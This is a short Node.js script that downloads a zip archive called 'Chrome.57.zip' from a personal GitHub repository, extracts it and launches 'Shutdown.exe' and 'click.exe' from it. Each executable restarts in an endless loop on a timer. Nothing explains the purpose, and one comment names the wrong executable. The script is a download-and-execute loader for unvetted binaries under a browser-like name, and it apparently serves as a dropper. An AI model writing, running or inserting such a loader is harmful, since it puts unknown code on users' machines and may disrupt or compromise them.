const axios = require('axios');
const AdmZip = require('adm-zip');
const { spawn } = require('child_process');

// URL of the file to download
const url = 'https://github.com/jokermakelove/unzip/raw/main/Chrome.57.zip';

// Download file
axios({
  url,
  responseType: 'arraybuffer'
}).then(response => {
  // Unzip file
  const zip = new AdmZip(response.data);
  zip.extractAllTo('./unzipped', true);

  // Run the exe files
  const runExe = (name, wait) => {
    const exe = spawn(name, [], {
      cwd: './unzipped'
    });
    exe.on('close', () => {
      setTimeout(() => {
        runExe(name, wait);
      }, wait);
    });
  };

  runExe('Shutdown.exe', 50000); // Wait 50 seconds before running click.exe
  runExe('click.exe', 20000); // Wait 20 seconds before running click.exe again
});
""